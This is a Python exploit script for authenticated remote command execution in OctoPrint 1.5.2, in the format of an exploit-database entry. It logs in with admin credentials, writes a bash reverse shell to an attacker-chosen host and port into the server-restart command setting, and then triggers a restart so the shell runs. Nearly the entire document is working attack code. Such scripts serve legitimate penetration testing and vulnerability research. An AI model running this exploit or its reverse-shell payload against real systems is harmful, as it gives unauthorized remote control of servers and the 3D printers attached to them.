#!/usr/bin/env python3

# Exploit Title: OctoPrint 1.5.2 - Remote Command Execution [Authenticated Admin Righst]
# Date: September 6, 2021
# Exploit Author: rekkatz
# Vendor Homepage: https://octoprint.org/
# Software Link: https://octoprint.org/download/
# Version: OctoPrint 1.5.2
# Tested on: Ubuntu 21.04 & OctoPi 0.18

import sys
import time
import urllib3
import requests
import argparse

from pwn import *
from signal import *

def handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

def exploit(**kwargs):

    # Disable warnings certificate SSL
    urllib3.disable_warnings()

    # POST login credentials to /api/login
    print(f"\n[+] Logging in to Octoprint Server... ", end="")

    data_login = {
        'user': args.username,
        'pass': args.password,
    }

    s = requests.session()

    r = s.post(f"{args.main_url}/api/login", json=data_login, verify=False)

    if r.status_code == 200:
        print("OK")
    else:
        print("FAIL")
        print("\n[!] An error has ocurred. Check credentials and try again.")
        print("[!] Exiting...")
        sys.exit(1)

    # POST change restart octoprint service command settings with RCE to /api/settings
    print("[+] Setting reverse shell... ", end="")

    reverse_shell = f"bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"

    set_rce = {"server": {"commands": {"serverRestartCommand": reverse_shell}}}

    r = s.post(f"{args.main_url}/api/settings", json=set_rce, verify=False)

    if r.status_code == 200:
        print("OK")

    else:
        print("FAIL")
        print("\n[!] An error has ocurred. Try again.]")
        print("[!] Exiting...")
        sys.exit(1)

    input(f"\n[*] Configure NETCAT to listen on port {args.lport} and press any key to continue: ")

    # POST executing RCE

    s.post(f"{args.main_url}/api/system/commands/core/restart", verify=False)

if __name__ == '__main__':

    # Ctrl + C
    signal(SIGINT, handler)

    # Arguments
    parser = argparse.ArgumentParser(usage='%(prog)s [options]')
    parser.add_argument('-u', type=str, help='Main URL with port if not 80/http or 443/https', required=True, dest='main_url')
    parser.add_argument('-U', type=str, help='Username Octoprint Login', required=True, dest='username')
    parser.add_argument('-P', type=str, help='Password Octoprint Login', required=True, dest='password')
    parser.add_argument('-lp', type=int, help='Local port for reverse shell. Default: 443', default=443, dest='lport')
    parser.add_argument('-lh', type=str, help='Local host for reverse shell', required=True, dest='lhost')
    args = parser.parse_args()


    exploit(**vars(args))
